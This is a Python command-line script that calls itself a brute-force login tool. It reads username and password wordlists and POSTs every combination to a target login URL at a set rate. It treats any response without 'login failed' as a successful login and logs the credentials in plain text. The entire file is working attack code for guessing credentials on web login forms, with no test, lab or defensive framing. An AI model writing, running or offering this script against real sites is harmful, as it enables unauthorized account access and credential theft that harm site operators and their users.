import requests
import argparse
import time
import logging
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO)

def is_valid_url(url):
    """Check if the URL is valid."""
    parsed_url = urlparse(url)
    return parsed_url.scheme in ['http', 'https'] and bool(parsed_url.netloc)

def read_file(file_path):
    """Read usernames or passwords from a file."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        logging.error(f"File not found: {file_path}")
        return []
    except IOError as e:
        logging.error(f"Error reading file {file_path}: {e}")
        return []

def brute_force_login(url, usernames, passwords, rate):
    """Attempt to brute-force login credentials."""
    if not is_valid_url(url):
        logging.error(f"Invalid URL: {url}")
        return

    for username in usernames:
        for password in passwords:
            payload = {'username': username, 'password': password}
            try:
                logging.info(f"Attempting login with username: {username} and password: {password}")
                response = requests.post(url, data=payload, timeout=10)
                response.raise_for_status()
                if 'login failed' in response.text.lower():  # Adjust this based on actual login failure response
                    logging.info(f"Login failed for username: {username}, password: {password}")
                else:
                    logging.info(f"Successful login with username: {username}, password: {password}")
                    return
            except requests.RequestException as e:
                logging.error(f"An error occurred: {e}")
            time.sleep(1 / rate)

def main():
    """Main function to parse arguments and run brute force attack."""
    parser = argparse.ArgumentParser(description="Brute-force login tool.")
    parser.add_argument('-url', '--url', required=True, help='Login URL')
    parser.add_argument('-usernames_file', '--usernames_file', required=True, help='Path to file with usernames')
    parser.add_argument('-passwords_file', '--passwords_file', required=True, help='Path to file with passwords')
    parser.add_argument('-rate', '--rate', type=float, default=1.0, help='Rate of requests per second (default: 1.0)')

    args = parser.parse_args()

    usernames = read_file(args.usernames_file)
    passwords = read_file(args.passwords_file)

    if not usernames:
        logging.error("No usernames found. Exiting.")
        return

    if not passwords:
        logging.error("No passwords found. Exiting.")
        return

    brute_force_login(args.url, usernames, passwords, args.rate)

if __name__ == '__main__':
    main()
